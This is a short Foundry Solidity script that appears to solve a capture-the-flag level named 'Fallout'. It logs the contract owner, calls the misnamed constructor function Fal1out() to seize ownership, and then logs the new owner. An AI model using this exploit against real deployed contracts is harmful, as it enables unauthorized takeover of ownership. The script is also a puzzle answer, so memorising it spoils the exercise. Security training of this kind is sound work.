pragma solidity ^0.6.0;

import "../src/level2.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract Solution is Script {
    Fallout public ins = Fallout(payable(0x94eBA8fDBA761f3A54C87e44488b25616F03352B));

    // SPDX-License-Identifier: MIT

    function run() external {

        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        // previous owner
        console.log(ins.owner());
        ins.Fal1out();
        console.log(ins.owner());
        vm.stopBroadcast();
    }
}